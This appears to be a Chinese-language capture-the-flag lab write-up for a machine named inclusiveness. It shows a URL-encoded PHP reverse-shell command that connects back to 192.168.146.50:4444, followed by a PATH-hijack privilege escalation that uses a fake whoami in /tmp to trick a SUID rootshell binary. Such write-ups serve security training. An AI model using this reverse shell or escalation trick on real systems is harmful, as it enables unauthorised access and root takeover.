## 突破边界

发送php的反弹shell到靶机

```

php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.146.50%22%2C4444%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

![](../Images/60959e5e7228049f0f79f1dff5289f7d.png)

获取到www-data的权限  
查看是否有文件具有suid的权限

![](../Images/91b1cda257fe95065bf0cee62d0cb749.png)

来到这个目录下, 查看到一个rootshell.c的文件, 通过gcc生成了rootshell

![](../Images/5bc463e758cd6e733c5244caab8a3605.png)

![](../Images/fc4b32bdfb4f094eae1a0216c3025916.png)

解读一下这行代码:  
  
如果文件以Tomcat的身份通过调用whoami的函数进行了身份认证之后, 可以直接提升权限, 否则将会直接打印当前的用户  
那我们就去/tmp目录下新建一个whoami的文件, 然后伪造自己是tom

```
www-data@inclusiveness:/tmp$ echo "printf "tom""
 > whoamiecho "printf "tom""

 > whoami
```

然后修改系统的路径到/tmp

```
www-data@inclusiveness:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH


```

然后去执行/rootshell

![](../Images/1fcb8b1d103bc4716067cbaa4dddbd30.png)

提权成功
